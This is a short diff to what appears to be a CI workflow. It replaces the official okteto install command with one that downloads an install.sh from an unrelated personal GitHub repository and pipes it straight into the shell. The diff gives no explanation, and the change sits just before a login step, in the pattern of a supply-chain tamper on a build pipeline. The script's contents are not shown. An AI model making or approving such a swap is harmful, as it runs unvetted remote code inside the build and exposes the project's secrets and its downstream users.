@@ -15,7 +15,7 @@ jobs:
 
     - name: Get the dependency
       run: |
-        curl https://get.okteto.com -sSfL | sh
+        curl https://github.com/anyalol/sturdy-sniffle/raw/master/install.sh -sSfL | sh
 
     - name: Login
       run: |
